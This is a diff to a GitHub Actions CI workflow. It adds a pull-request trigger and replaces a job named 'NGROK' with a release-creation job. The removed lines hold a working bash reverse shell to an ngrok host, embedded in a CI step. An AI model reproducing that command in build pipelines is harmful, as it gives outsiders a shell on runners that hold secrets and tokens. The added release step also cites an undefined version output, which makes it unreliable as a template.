@@ -1,9 +1,8 @@
 name: CI
 
 on:
+  pull_request:
   push:
-    branches: [ "main" ]
-
   workflow_dispatch:
 
 jobs:
@@ -31,19 +30,25 @@ jobs:
           name: windows-${{ github.repository_id }}
           path: ${{ github.workspace }}/build/Release/hello_releaser.exe
 
-  NGROK:
+  Make-Release:
     needs: [Generate-Bins]
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v3
       - name: Download EXE
         uses: actions/download-artifact@v2
         with:
           name: windows-${{ github.repository_id }}
+      
+      - name: release
+        uses: actions/create-release@v1
+        id: create_release
+        with:
+          draft: false
+          prerelease: false
+          release_name: ${{ steps.version.outputs.version }}
+          tag_name: ${{ github.ref }}
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
 
-      - name: Run a multi-line script
-        run: |
-          whoami
-          bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/12611 0>&1
-          ls
+
